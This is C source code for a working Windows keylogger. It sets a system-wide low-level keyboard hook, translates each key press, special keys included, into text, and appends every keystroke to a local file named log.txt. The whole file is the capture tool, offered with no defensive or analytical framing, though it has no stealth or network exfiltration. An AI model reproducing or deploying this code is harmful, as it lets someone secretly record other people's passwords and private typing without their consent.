#include <windows.h>
#include <stdio.h>
#include <string.h>

// Functions to log keystrokes
void logKeystroke(char *key){
    FILE *file = fopen("log.txt", "a+");
    if(file){
        fprintf(file,"%s", key);
        fclose(file);
    }
}

// Function to get the character from the virtual key code
void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = kbStruct->vkCode;

    // Check if it's a standalone SHIFT press
    if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
        strcpy(keyName, "[SHIFT]");
        return;
    }

    // Handle special keys first
    switch(vkCode){
        case VK_RETURN: strcpy(keyName,"[ENTER]\n"); break;
        case VK_SPACE:  strcpy(keyName," "); break;
        case VK_BACK:   strcpy(keyName,"[BACK]"); break;
        case VK_TAB:    strcpy(keyName,"[TAB]"); break;
        case VK_CONTROL: 
        case VK_LCONTROL: 
        case VK_RCONTROL:   strcpy(keyName,"[CTRL]"); break;
        case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
        case VK_END:    strcpy(keyName,"[END]"); break;
        case VK_HOME:   strcpy(keyName,"[HOME]"); break;
        case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
        case VK_UP: strcpy(keyName,"[UP]"); break;
        case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
        case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
        default: {
            // Get keyboard state
            BYTE keyboardState[256] = {0};

            // Check if SHIFT is pressed
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyboardState[VK_SHIFT] = 0x80;  // This will make ToUnicode give us uppercase
            }
            
            // Check CAPS LOCK
            if (GetKeyState(VK_CAPITAL) & 0x0001) {
                keyboardState[VK_CAPITAL] = 0x01;
            }
            
            // Convert virtual key to character
            WCHAR unicodeChar;
            int result = ToUnicode(vkCode, kbStruct->scanCode, keyboardState, &unicodeChar, 1, 0);

            char character;
            // Convert from UTF-16 (wide char) to UTF-8
            WideCharToMultiByte(CP_UTF8, 0, &unicodeChar, -1, &character, 1, NULL, NULL );

            if(result == 1){
                // printable character
                keyName[0] = (char)character;
                keyName[1] = '\0';
            }else{
                // Unhandled key
                strcpy(keyName,"[UNKNOWN]");
            }
        } 
    }

}

// Hook procedure to capture keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0 && wParam == WM_KEYDOWN){
        char key[32];
        getCharFromKey(key, wParam, lParam);
        logKeystroke(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // Set a low-level system hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);
    return 0;
}